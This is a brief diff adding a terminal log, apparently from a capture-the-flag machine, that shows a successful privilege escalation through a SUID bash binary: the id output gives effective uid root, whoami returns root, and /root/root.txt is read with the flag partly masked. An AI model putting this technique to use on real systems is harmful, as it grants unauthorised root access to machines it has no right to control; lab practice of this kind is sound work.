@@ -1,0 +1,10 @@
+[+] SUCCESS — SUID bash at 
+uid=1000(m****o) gid=1000(m****o) euid=0(root) groups=1000(m****o)
+.suid_bash: cannot set terminal process group (-1): Inappropriate ioctl for device
+.suid_bash: no job control in this shell
+.suid_bash-5.2# whoami
+whoami
+root
+.suid_bash-5.2# cat /root/root.txt
+cat /root/root.txt
+598d082b*********cdaf66eaf8
